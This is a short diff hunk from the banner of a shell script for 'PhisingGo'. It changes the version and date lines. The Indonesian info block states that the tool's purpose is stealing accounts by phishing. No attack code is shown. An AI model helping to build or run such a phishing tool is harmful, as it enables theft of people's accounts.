@@ -209,8 +209,8 @@ printf "\e[0;47;90;1m[              PhisingGo, My Github: @stepbyatepexe        
 toilet -f smslant 'PhisingGo'
 printf "
 Nama        : PhisingGo
-Versi       : 3.4 (Update: 06 Juni 2020, 1:30 PM)
-Tanggal     : 25 Desember 2019
+Versi       : 1.1 (Update: 30 Januari 2020, 1:30 PM)
+Tanggal     : 20 Juli 2019
 Mod         : Nedi Senja
 Tujuan      : Mencuri akun dengan metode phising
               menggunakan tool PhisingGo
